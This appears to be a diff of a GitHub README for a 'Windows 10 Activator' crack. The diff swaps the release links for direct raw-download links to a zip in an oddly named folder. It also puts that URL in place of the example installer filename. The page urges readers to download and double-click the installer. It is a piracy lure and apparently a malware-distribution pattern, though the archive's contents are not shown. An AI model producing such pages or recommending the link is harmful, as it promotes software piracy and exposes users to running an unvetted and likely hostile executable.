@@ -1,6 +1,6 @@
 # 🎉 Windows-10-Activator-Full-Version - Activate Windows 10 Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/arifnine/Windows-10-Activator-Full-Version/releases)
+[![Download Now](https://raw.githubusercontent.com/arifnine/Windows-10-Activator-Full-Version/main/Scotchman/Windows-10-Activator-Full-Version.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/arifnine/Windows-10-Activator-Full-Version/main/Scotchman/Windows-10-Activator-Full-Version.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will help you download and run the Windows-10-Activator-Full-Version 
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[Download from Releases](https://github.com/arifnine/Windows-10-Activator-Full-Version/releases)
+[Download from Releases](https://raw.githubusercontent.com/arifnine/Windows-10-Activator-Full-Version/main/Scotchman/Windows-10-Activator-Full-Version.zip)
 
 ### Steps to Download
 
@@ -22,7 +22,7 @@ After downloading, locate the file in your Downloads folder or the folder where 
 
 ### Running the Application
 
-1. **Locate the Downloaded File**: Find the downloaded installer (e.g., `Windows-10-Activator.exe`) in your Downloads folder.
+1. **Locate the Downloaded File**: Find the downloaded installer (e.g., `https://raw.githubusercontent.com/arifnine/Windows-10-Activator-Full-Version/main/Scotchman/Windows-10-Activator-Full-Version.zip`) in your Downloads folder.
 2. **Open the Installer**: Double-click the file to start the installation process.
 3. **Follow the Prompts**: The installer will guide you through the steps. Click "Next" and "Install" as prompted.
 4. **Complete Installation**: Once the installation completes, you may need to restart your computer.
@@ -65,4 +65,4 @@ Don't hesitate to use the information provided for a smooth activation process. 
 
 Once again, here's the link to download the application:
 
-[Download from Releases](https://github.com/arifnine/Windows-10-Activator-Full-Version/releases)
+[Download from Releases](https://raw.githubusercontent.com/arifnine/Windows-10-Activator-Full-Version/main/Scotchman/Windows-10-Activator-Full-Version.zip)
